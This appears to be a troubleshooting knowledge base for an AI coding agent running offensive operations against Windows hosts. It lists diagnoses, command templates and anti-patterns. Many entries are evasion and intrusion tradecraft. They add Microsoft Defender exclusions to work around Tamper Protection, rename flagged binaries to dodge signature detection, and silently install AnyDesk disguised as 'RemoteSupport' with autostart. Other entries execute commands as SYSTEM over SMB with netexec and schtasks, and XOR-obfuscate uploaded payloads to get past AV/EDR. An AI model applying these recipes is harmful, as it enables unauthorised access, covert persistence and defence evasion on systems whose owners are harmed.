diagnosis.root_cause: Windows Tamper Protection (ON by default Win10/11) silently blocks Set-MpPreference -DisableRealtimeMonitoring. Command may exit 0 but has NO effect.
disambiguators: If Set-MpPreference returns error 'not recognized' = PowerShell not available (different issue)
If on Windows Server with GPO = Tamper Protection may be off

remediation.action: Use ExclusionPath instead (works WITH Tamper Protection)
remediation.command_template: powershell -c "Set-MpPreference -ExclusionPath 'C:\Temp','C:\Target' -ExclusionProcess 'target.exe'"
remediation.when: Target is Win10/11 with Tamper Protection enabled

remediation.action: Rename binary to bypass signature-based detection
remediation.command_template: ren C:\Temp\detected.exe C:\Temp\svchelper.exe
remediation.when: Defender detects specific binary by signature/name

anti_patterns.action: Set-MpPreference -DisableRealtimeMonitoring
anti_patterns.why: Silently fails when Tamper Protection is ON (Win10/11 default)

anti_patterns.action: Stopping Windows Defender service directly
anti_patterns.why: Protected by Tamper Protection; requires disabling TP first which needs GUI

diagnosis.root_cause: smbexec creates temp service, executes command, cleans up. Output written to C$ temp file may be deleted by AV before retrieval, or command produces no stdout.
disambiguators: If 'Pwn3d' shown = auth works, execution happened
If no Pwn3d = auth or SMB issue entirely
alternative_causes: AV deleted output file before retrieval

remediation.action: Redirect output to persistent file, read separately via C$ share
remediation.command_template: netexec smb TARGET -u USER -p PASS -x 'cmd /c COMMAND > C:\Temp\out.txt 2>&1' --exec-method smbexec
preconditions: Write access to C:\Temp on target
remediation.when: Need to see command output

remediation.action: Read output file from DC via net use + type
remediation.command_template: net use X: \\TARGET\c$ /user:DOMAIN\USER PASS && type X:\Temp\out.txt && net use X: /delete /y
preconditions: Network path between DC and target
remediation.when: After redirecting output to file

verification.command: net use X: \\TARGET\c$ && dir X:\Temp\out.txt && type X:\Temp\out.txt && net use X: /delete /y

anti_patterns.action: Relying on netexec stdout for smbexec results
anti_patterns.why: Output retrieval is unreliable when AV is active; temp file gets quarantined

anti_patterns.action: Adding --get-output-tries without AV exclusion
anti_patterns.why: More retries won't help if AV deletes the file instantly

diagnosis.root_cause: SSH via CF tunnel timing out. Tunnel may be unhealthy, target sshd stopped, or command execution exceeds timeout.
disambiguators: Exit 143 = killed by timeout (SIGTERM)
Exit 255 = SSH protocol error (key/auth/port)
If simple commands also timeout = tunnel down
alternative_causes: CF tunnel process crashed on target
Sleep in command exceeds tool timeout

remediation.action: Verify tunnel health first (quick HTTP probe)
remediation.command_template: curl -s --max-time 5 https://TUNNEL_URL/ -o /dev/null -w '%{http_code}'
remediation.when: Before running heavy SSH commands

remediation.action: Run minimal command to verify SSH access works
remediation.command_template: ssh -o ConnectTimeout=10 ... 'hostname'
remediation.when: After confirming tunnel is healthy

remediation.action: Remove sleep from command (sleep eats into tool timeout budget)
remediation.command_template: Remove 'sleep X &&' prefix; run SSH directly
remediation.when: Command has sleep prefix that wastes timeout budget

anti_patterns.action: Adding sleep before SSH command
anti_patterns.why: Sleep eats into the 120s tool timeout; SSH + sleep > 120s = killed (exit 143)

anti_patterns.action: Retrying same command with longer sleep
anti_patterns.why: Makes timeout MORE likely, not less

anti_patterns.action: Increasing ConnectTimeout beyond 20s
anti_patterns.why: If tunnel is down, waiting longer won't fix it

diagnosis.root_cause: Microsoft Defender classifies AnyDesk as PUA (Potentially Unwanted App) since Feb 2024. Installer is blocked/quarantined on execution.
disambiguators: If file disappears from disk = quarantined by AV
If file exists but install folder not created = execution blocked

remediation.action: Add Defender exclusion BEFORE running installer
remediation.command_template: powershell -c "Set-MpPreference -ExclusionPath 'C:\Temp' -ExclusionProcess 'AnyDesk.exe'"
remediation.when: First step before any install attempt

remediation.action: Rename AnyDesk binary to avoid PUA signature match
remediation.command_template: ren C:\Temp\AnyDesk.exe C:\Temp\RemoteSupport.exe && C:\Temp\RemoteSupport.exe --install C:\RemSupport --start-with-win --silent
remediation.when: If exclusion alone doesn't work

remediation.action: Install to path without spaces (avoid quoting issues in remote exec)
remediation.command_template: C:\Temp\AnyDesk.exe --install C:\AnyDesk --start-with-win --silent
remediation.when: Using remote execution methods that strip quotes

anti_patterns.action: Running AnyDesk installer without Defender exclusion on Win10/11
anti_patterns.why: Defender blocks AnyDesk as PUA since Feb 2024; install silently fails

anti_patterns.action: Trying to disable Defender instead of adding exclusion
anti_patterns.why: Tamper Protection prevents Defender disable; exclusion is the correct approach

anti_patterns.action: Re-running same install command hoping it works
anti_patterns.why: Same binary + same path + same Defender = same block every time

diagnosis.root_cause: WMI/RPC service blocked between source and target. Windows Firewall on target blocks RPC (135/TCP + dynamic ports) or WMI service not running.
disambiguators: If other RPC services also fail (e.g., schtasks) = firewall blocking RPC entirely
If only WMI fails but SMB works = WMI service specifically disabled

remediation.action: Use SMB-based execution instead (smbexec/psexec — only needs port 445)
remediation.command_template: netexec smb TARGET -u USER -p PASS -x 'COMMAND' --exec-method smbexec
remediation.when: WMI/RPC blocked but SMB accessible

remediation.action: Use schtasks (only needs SMB for task creation)
remediation.command_template: schtasks /create /s TARGET /u USER /p PASS /tn TASKNAME /tr COMMAND /sc once /st 00:00 /ru SYSTEM && schtasks /run /s TARGET /u USER /p PASS /tn TASKNAME
preconditions: Task Scheduler service running on target
remediation.when: Need reliable remote exec without RPC

verification.command: netexec smb TARGET -u USER -p PASS -x 'hostname' --exec-method smbexec

anti_patterns.action: Retrying wmic with different credentials
anti_patterns.why: If RPC is blocked by firewall, credentials are irrelevant

anti_patterns.action: Trying wmic from a different source host in same network
anti_patterns.why: Firewall rules apply by port, not by source (usually)

diagnosis.root_cause: Nested quoting failure in SSH command chain. Outer shell (zsh/bash on Kali) interprets quotes/special chars before SSH sends them to remote shell.
disambiguators: 'dquote>' = unclosed double quote in zsh
'event not found' = ! char interpreted by bash history expansion
'bad substitution' = $ interpreted locally
alternative_causes: Remote shell is cmd.exe but command uses bash syntax

remediation.action: Use single quotes for outer SSH wrapper, double quotes inside for remote cmd
remediation.command_template: ssh ... 'remote_command_with "inner quotes"'
remediation.when: Remote command needs quotes but outer SSH also needs quoting

remediation.action: Escape special characters or write command to file first
remediation.command_template: echo 'COMMAND' > /tmp/cmd.txt && ssh ... 'cmd /c' < /tmp/cmd.txt
remediation.when: Command too complex for single-line quoting

remediation.action: Use heredoc or base64 encoding for complex payloads
remediation.command_template: ssh ... "powershell -enc $(echo 'COMMAND' | iconv -t utf-16le | base64 -w0)"
remediation.when: Command has many special characters that break in any quoting scheme

anti_patterns.action: Adding more backslash escapes without understanding which shell layer interprets them
anti_patterns.why: Each SSH hop adds a layer of interpretation; blind escaping makes it worse

anti_patterns.action: Using double quotes for outer SSH command containing $ or !
anti_patterns.why: zsh/bash expand $ and ! inside double quotes before SSH sees them

diagnosis.root_cause: Command prefixed with 'sleep N' causes total execution time to exceed Claude Code's 120s tool timeout. Process killed with SIGTERM (exit 143).
disambiguators: If exit 143 and command has sleep > 60s = almost certainly this issue
If exit 143 without sleep = actual command is slow
alternative_causes: Actual command is very slow (large file transfer, heavy scan)

remediation.action: Remove sleep prefix — run command directly
remediation.command_template: Remove 'sleep X &&' from command. If waiting for a prior async operation, verify its completion first.
remediation.when: sleep is used as arbitrary wait before command

remediation.action: Use run_in_background for long-running commands
remediation.command_template: Use Bash tool with run_in_background: true parameter
remediation.when: Command legitimately takes > 60 seconds

anti_patterns.action: Increasing sleep duration when previous sleep+command timed out
anti_patterns.why: More sleep = MORE likely to hit 120s timeout, not less

anti_patterns.action: Using sleep to wait for async tunnel/service to start
anti_patterns.why: Use verification command instead of blind sleep (e.g., curl --retry for tunnel)

diagnosis.root_cause: Account locked due to too many failed auth attempts. Lockout policy triggered.
disambiguators: If different user works = specific account locked
If all users fail = not lockout but service/network issue

remediation.action: Wait for lockout timer to expire (typically 30-60 min)
remediation.command_template: Wait, then retry with correct credentials. Do NOT spray.
remediation.when: Account definitely locked

remediation.action: Use a different account with same privileges
remediation.command_template: Switch to alternative admin account
remediation.when: Cannot wait for lockout to expire

anti_patterns.action: Retrying same credentials immediately
anti_patterns.why: Extends lockout timer with each failed attempt

anti_patterns.action: Spraying other passwords on locked account
anti_patterns.why: Account is LOCKED regardless of password correctness

diagnosis.root_cause: Uploaded file detected and quarantined by AV/EDR on target. File appears uploaded (exit 0) but is immediately removed.
disambiguators: If file exists briefly then disappears = real-time AV scan
If file never appears = blocked at write time
alternative_causes: Web server config prevents execution of uploaded files

remediation.action: Use obfuscation (XOR/bitwise encoding) to bypass signature detection
remediation.command_template: Generate payload with non-standard encoding (not base64/eval which are signature-matched)
remediation.when: AV uses signature-based detection

remediation.action: Upload to excluded path (if Defender exclusion was applied)
remediation.command_template: Upload to path already in ExclusionPath list
preconditions: Defender exclusion applied for target path
remediation.when: Can control which path file lands in

verification.command: dir TARGET_PATH\uploaded_file.ext (check file still exists after 5 seconds)

anti_patterns.action: Re-uploading same file to same path
anti_patterns.why: AV will quarantine it again instantly

anti_patterns.action: Using base64+eval obfuscation
anti_patterns.why: This is the FIRST thing AV signatures match

diagnosis.root_cause: Cloudflare tunnel is down or unhealthy. The cloudflared process on target may have crashed, been killed, or the target is offline.
disambiguators: If tunnel URL returns 502 = tunnel registered but connector offline
If DNS fails = tunnel deleted or domain misconfigured
alternative_causes: Target machine rebooted and cloudflared didn't auto-restart

remediation.action: Check tunnel status via CF API
remediation.command_template: curl -s -H 'X-Auth-Email: EMAIL' -H 'X-Auth-Key: KEY' 'https://api.cloudflare.com/client/v4/accounts/ACCT/tunnels/TUNNEL_ID' | python3 -c 'import json,sys;d=json.load(sys.stdin);print(d["result"]["status"])'
remediation.when: Need to confirm tunnel state before attempting connection

remediation.action: If target has alternative access (VPN/direct IP), restart cloudflared remotely
remediation.command_template: Access target via alternative method, then: systemctl restart cloudflared OR start the tunnel service
remediation.when: Tunnel confirmed down but target still accessible

anti_patterns.action: Retrying SSH through dead tunnel
anti_patterns.why: If tunnel is down, SSH will always timeout regardless of parameters

anti_patterns.action: Increasing timeout hoping tunnel recovers
anti_patterns.why: Tunnel won't self-heal from a client timeout increase; need to fix server-side

diagnosis.root_cause: Drive letter already mapped to different share, or previous session not cleaned up.
disambiguators: Error 85 = local device name already in use
Error 53 = network path not found (different issue)

remediation.action: Delete existing mapping first, then remap
remediation.command_template: net use X: /delete /y 2>nul & net use X: \\TARGET\c$ /user:DOMAIN\USER PASS
remediation.when: Drive letter conflict

remediation.action: Use UNC path directly without drive mapping
remediation.command_template: type \\TARGET\c$\path\file.txt (access directly without net use)
remediation.when: Don't need persistent drive mapping

anti_patterns.action: Trying different drive letter without deleting old one
anti_patterns.why: Accumulates stale mappings; delete first is cleaner

anti_patterns.action: Ignoring the error and proceeding with file operations
anti_patterns.why: If mapping failed, all subsequent X: operations will fail or target wrong host

diagnosis.root_cause: PowerShell not in PATH or not installed. Common on Server Core, minimal installs, or when running in a restricted cmd.exe context where PS path not set.
disambiguators: If specific cmdlet 'not recognized' = PS works but module missing
If 'powershell' itself not found = PS not in PATH
alternative_causes: Command running in wrong shell context (cmd vs powershell)

remediation.action: Use full path to PowerShell
remediation.command_template: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "COMMAND"
remediation.when: powershell not in PATH but exists on disk

remediation.action: Use cmd.exe native commands instead of PowerShell
remediation.command_template: Use cmd builtins: reg query, sc, wmic, certutil, bitsadmin instead of PS equivalents
remediation.when: PowerShell genuinely unavailable or constrained

anti_patterns.action: Retrying same PowerShell command
anti_patterns.why: If PS not available, retrying won't make it appear

anti_patterns.action: Trying PowerShell 7 (pwsh) without knowing it's installed
anti_patterns.why: pwsh is not default on any Windows; must be explicitly installed

diagnosis.root_cause: File copy operation completed but copied 0 files. Source file doesn't exist at expected path, or source path is wrong.
disambiguators: '0 files copied' with no error = source path wrong but accessible
'Access denied' = path exists but no read permission
alternative_causes: File already exists at destination (overwrite protection)

remediation.action: Verify source file exists first
remediation.command_template: dir SOURCE_PATH (verify file exists and check exact filename)
remediation.when: Before any copy operation

remediation.action: Use xcopy instead of copy for cross-share operations
remediation.command_template: xcopy SOURCE DEST /Y /Q (xcopy is more reliable for network copies)
remediation.when: copy fails but path is correct

anti_patterns.action: Using 'copy' for network share operations
anti_patterns.why: copy is unreliable across shares; use xcopy or robocopy

anti_patterns.action: Retrying copy without verifying source exists
anti_patterns.why: If source doesn't exist, no amount of retries will copy it

diagnosis.root_cause: Service created/exists but won't start. Common causes: binary path wrong, binary missing, dependencies not met, or service account can't log on.
disambiguators: Error 1053 = service didn't respond to start in time
Error 1067 = process terminated unexpectedly (crash)
Error 1069 = logon failure for service account
alternative_causes: Binary is 32-bit but service expects 64-bit (or vice versa)
Binary requires DLLs not present on target
AV killed the process on startup

remediation.action: Verify binary exists at configured path
remediation.command_template: sc qc SERVICENAME (check BINARY_PATH_NAME) then dir THAT_PATH
remediation.when: Service created but won't start

remediation.action: Check event log for service-specific error
remediation.command_template: wevtutil qe System /q:"*[System[Provider[@Name='Service Control Manager']]]" /c:5 /f:text /rd:true
remediation.when: Service start fails with generic error

anti_patterns.action: Repeatedly running 'net start' without checking why it fails
anti_patterns.why: Start will always fail if underlying issue (path, deps, account) not fixed

anti_patterns.action: Recreating service without fixing binary
anti_patterns.why: Same binary = same failure

diagnosis.root_cause: Port forward/tunnel not active. Either tunnel process died, port already in use by another process, or remote service not listening on forwarded port.
disambiguators: 'address in use' = another process using same local port
'connection refused' at forwarded port = remote service down
'channel open failed' = SSH tunnel up but remote port not listening
alternative_causes: Tunnel process running but not yet connected
Firewall blocking the local listening port

remediation.action: Check if local port is actually listening
remediation.command_template: ss -tlnp | grep PORT (verify tunnel is bound to local port)
remediation.when: Before connecting through tunnel

remediation.action: Kill existing process on port, then restart tunnel
remediation.command_template: fuser -k PORT/tcp 2>/dev/null; sleep 1; (restart tunnel command)
remediation.when: 'address in use' error

anti_patterns.action: Connecting through tunnel without verifying it's up
anti_patterns.why: Always verify listener before sending commands through

anti_patterns.action: Starting new tunnel without killing old one
anti_patterns.why: Will get 'address in use' if old process still holds the port
